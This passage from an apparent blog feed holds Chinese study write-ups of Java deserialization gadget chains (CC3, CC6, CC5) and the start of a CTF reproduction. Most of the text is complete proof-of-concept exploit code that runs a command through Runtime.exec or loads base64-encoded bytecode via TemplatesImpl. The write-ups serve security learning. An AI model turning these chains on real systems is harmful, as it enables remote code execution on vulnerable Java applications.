class="hljs-string">&quot;EWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEA&quot;</span> +<br>                <span class="hljs-string">&quot;BGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;AAQAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAA8ACwAAACAAAwAAAAEADAAN&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAA&quot;</span> +<br>                <span class="hljs-string">&quot;AAIACgAAAAYAAQAAABQACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEA&quot;</span> +<br>                <span class="hljs-string">&quot;FwAYAAMAEgAAAAQAAQATAAkAGQAaAAEACQAAACsAAAABAAAAAbEAAAACAAoAAAAGAAEAAAAYAAsA&quot;</span> +<br>                <span class="hljs-string">&quot;AAAMAAEAAAABABsAHAAAAAEAHQAeAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAK&quot;</span> +<br>                <span class="hljs-string">&quot;AAAADgADAAAAGQAEABoADQAbAAsAAAAMAAEAAAAOAAwADQAAABIAAAAEAAEAHwABACAAAAACACE=&quot;</span>);<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        <span class="hljs-comment">//setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br>        Transformer[] faketransformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)<br>        &#125;;<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(faketransformers);<br>        Map outerMap = LazyMap.decorate(inerMap, chainedTransformer);<br><br>        HashMap&lt;TiedMapEntry,String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;test123&quot;</span>);<br>        outerMap.remove(<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>        setFieldValue(chainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br><br>        <span class="hljs-comment">// 序列化</span><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-comment">// 反序列化</span><br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);<br>        objectInputStream.readObject();<br>        objectInputStream.close();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Field field = obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111204553382.png" alt="image-20211111204553382"></p><p>在上面的代码中可以不用使用<code>_tfactiry</code>，因为它是瞬态的属性本身没法序列化，所以 POC 中不使用它也不会有影响</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111212011740.png" alt="image-20211111212011740"></p><p>在反序列化时它重写的<code>readobject()</code>方法会自动初始化改变量</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111212150797.png" alt="image-20211111212150797"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉CC链越往后面，这些链子的相关性就越大，学起来就越容易。好好学习，天天向上。</p><p>参考文章</p><p>P神代码审计</p><p><a href="https://ego00.blog.csdn.net/article/details/119780324">https://ego00.blog.csdn.net/article/details/119780324</a></p><p><a href="https://su18.org/post/ysoserial-su18-2/#commonscollections3">https://su18.org/post/ysoserial-su18-2/#commonscollections3</a></p><p><a href="https://y4tacker.blog.csdn.net/article/details/119084222">https://y4tacker.blog.csdn.net/article/details/119084222</a></p><p><a href="https://www.guildhab.top/2020/09/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e9-%e8%a7%a3%e5%af%86-ysoserial-commonscollections3-pop-chains/">https://www.guildhab.top/2020/09/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e9-%e8%a7%a3%e5%af%86-ysoserial-commonscollections3-pop-chains/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-CC3&quot;&gt;&lt;a href=&quot;#Java-CC3&quot; class=&quot;headerlink&quot; title=&quot;Java CC3&quot;&gt;&lt;/a&gt;Java CC3&lt;/h1&gt;&lt;h2 id=&quot;基础&quot;&gt;&lt;a href=&quot;#基础&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java CC6</title>
    <link href="http://example.com/2021/11/11/Java-CC6/"/>
    <id>http://example.com/2021/11/11/Java-CC6/</id>
    <published>2021-11-11T04:29:49.000Z</published>
    <updated>2021-11-11T04:30:29.577Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-CC链6"><a href="#Java-CC链6" class="headerlink" title="Java CC链6"></a>Java CC链6</h1><h2 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h2><p>在 CC6 的链中，还是想利用 LazyMap 类去调用 <code>get()</code> 函数来触发命令执行，这里和 CC5 一样选择了<code>TiedMapEntry</code>类，在这个类中存在一个<code>get()</code>方法</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211110084112675.png" alt="image-20211110084112675"></p><p>在 CC5 中也是利用了这个点，但是它是通过<code>TiedMapEntry</code>的<code>toString()</code>方法调用的，但是CC6中是利用<code>TiedMapEntry</code>类的<code>hashCode()</code>方法调用到<code>getvalue()</code>中的<code>get()</code>方法</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211110084301463.png" alt="image-20211110084301463"></p><p>这里又和 URLDNS 链有了相似之处，需要调用 <code>hashCode()</code> 我们就能够想到 URLDNS 链中的一些方法，利用<code>HashMap</code>类去调用到<code>hashCode()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211110092915169.png" alt="image-20211110092915169"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211110092951242.png" alt="image-20211110092951242"></p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>先尝试自己构造一下POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map outermap = LazyMap.decorate(inerMap,chainedTransformer);<br><br>        HashMap&lt;TiedMapEntry, Integer&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;TiedMapEntry, Integer&gt;();<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outermap,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        hashMap.put(tiedMapEntry,<span class="hljs-number">1</span>);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>???? 为什么在序列化的时候就弹出来了计算器</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211110094507745.png" alt="image-20211110094507745"></p><h2 id="真正的POC"><a href="#真正的POC" class="headerlink" title="真正的POC"></a>真正的POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] faketransformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(faketransformer);<br>        Map outermap = LazyMap.decorate(inerMap,chainedTransformer);<br><br>        HashMap&lt;TiedMapEntry, Integer&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;TiedMapEntry, Integer&gt;();<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outermap,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        hashMap.put(tiedMapEntry,<span class="hljs-number">1</span>);<br>        outermap.remove(<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>        Field field = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(chainedTransformer,transformers);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br>        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211110171250594.png" alt="image-20211110171250594"></p><p>将自己的代码和真正的POC对比一下发现了有几点不同</p><ol><li>代码中最开始使用了一个<code>faketransformer</code></li><li><code>outmap</code>使用了一次<code>remove()</code>方法</li></ol><h2 id="Why？"><a href="#Why？" class="headerlink" title="Why？"></a>Why？</h2><p>为什么这里要使用 <code>faketransformer</code>？</p><p>这个问题在 P神的代码审计5 中有相关解释</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211110224845472.png" alt="image-20211110224845472"></p><p>主要还是为了避免本地调试的时候触发命令执行</p><p>为什么要使用<code>remove()</code>?</p><p>首先在未使用<code>remove()</code>时是不能反序列化调用成功的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211110230055818.png" alt="image-20211110230055818"></p><p>调试中发现如果这里不使用<code>remove()</code>移除时，代码就会直接跳过 if 直接执行 else 返回结果，造成了代码的不执行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经过这几天的学习，对于 CC 链的构造已经差不多能够看懂了，但是在构造 POC 的时候还是有一些细节处理不到位，毕竟细节决定成败，所以继续努力吧。最后借用P神的一句话：<strong>独立思考很重要</strong></p><p>参考文章</p><p>P神代码审计</p><p><a href="https://su18.org/post/ysoserial-su18-2/#commonscollections6">https://su18.org/post/ysoserial-su18-2/#commonscollections6</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-CC链6&quot;&gt;&lt;a href=&quot;#Java-CC链6&quot; class=&quot;headerlink&quot; title=&quot;Java CC链6&quot;&gt;&lt;/a&gt;Java CC链6&lt;/h1&gt;&lt;h2 id=&quot;构造思路&quot;&gt;&lt;a href=&quot;#构造思路&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java CC链5</title>
    <link href="http://example.com/2021/11/10/Java-CC%E9%93%BE5/"/>
    <id>http://example.com/2021/11/10/Java-CC%E9%93%BE5/</id>
    <published>2021-11-10T00:27:02.000Z</published>
    <updated>2021-11-10T00:50:40.311Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-CC5"><a href="#Java-CC5" class="headerlink" title="Java CC5"></a>Java CC5</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在打东华杯的时候遇见一个 java 反序列化的题目，但是当时没有学习 Java CC5 的链子所以死活没有做出来，所以趁着这个机会一起学习一下 CC5 的链子。</p><blockquote><p>当时没有做出来是不知道怎么让 toString 方法自动调用，太亏了，后面问学长，学长都懒得回答这么菜的问题，属实是太菜了呀</p></blockquote><h2 id="CC5-分析"><a href="#CC5-分析" class="headerlink" title="CC5 分析"></a>CC5 分析</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211108222024890.png" alt="image-20211108222024890"></p><p>这个链子和 CC1的前大半部分是一样的，目的都是要调用到 <code>LazyMap</code> 类的 <code>get()</code> 然后触发命令执行。CC5链子使用了<code>BadAttributeValueExpException</code>类来代替<code>AnnotationInvocationHandler</code>类，还利用了一个新的类来调用<code>LazyMap</code>的<code>get</code>方法</p><p>在 CC1 中我们利用<code>LazyMap</code>类调用<code>get()</code>时造成命令执行的方法构造了利用链，不过在后面的版本中修复了<code>AnnotationInvocationHandler</code>类，所以这里就找到了一个新的利用链(CC5)</p><p>首先找到一个可以利用的<code>get()</code>方法，所以就 找到了<code>TideMapEntry</code>类</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211108220006308.png" alt="image-20211108220006308"></p><p>这里虽然有<code>get()</code>方法，但是要怎么触发呢？在这个类中发现<code>toString()</code>方法调用到了这个 函数，所以这里的问题就变成了如何调用到<code>toString()</code>方法？</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211108220120895.png" alt="image-20211108220120895"></p><p>这里就利用到了<code>BadAttributeValueExpException</code>类，这个类的<code>readObject()</code>方法中会调用<code>toString()</code>方法 </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211108220411317.png" alt="image-20211108220411317"></p><p>所以我们的思路就清楚了，借助<code>BadAttributeValueExpException</code>类反序列化时调用<code>TideMapEntry</code>类 <code>toString()</code>最后调用到<code>getalue()</code>中的<code>get()</code>触发命令执行</p><p>POC中大部分和CC1相同</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>          <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>          <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                  <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                  <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>          <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                  <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                  <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>          <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                  <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                  <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map inermap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outermap = LazyMap.decorate(inermap,chainedTransformer);<br><br>        BadAttributeValueExpException expException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outermap,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        Field val = clazz.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-keyword">true</span>);<br>        val.set(expException, tiedMapEntry);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(expException);<br>        objectOutputStream.close();<br><br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);<br>        objectInputStream.readObject();<br>        objectInputStream.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211108221156107.png" alt="image-20211108221156107"></p><h2 id="东华杯-Java-复现"><a href="#东华杯-Java-复现" class="headerlink" title="东华杯 Java 复现"></a>东华杯 Java 复现</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109150754356.png" alt="image-20211109150754356"></p><p>看到这里我们就够马上反应出 CC5 和利用 <code>defineClass</code> 加载字节码的操作，利用<code>javax.management.BadAttributeValueExpException</code>的<code>readObject()</code>方法调用到<code>ToStringBean</code>的<code>toString()</code>方法，最后利用<code>defineClass()</code>动态加载字节码完成命令执行</p><p>先构造需要使用的字节码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109235536455.png" alt="image-20211109235536455"></p><p>编写序列化利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 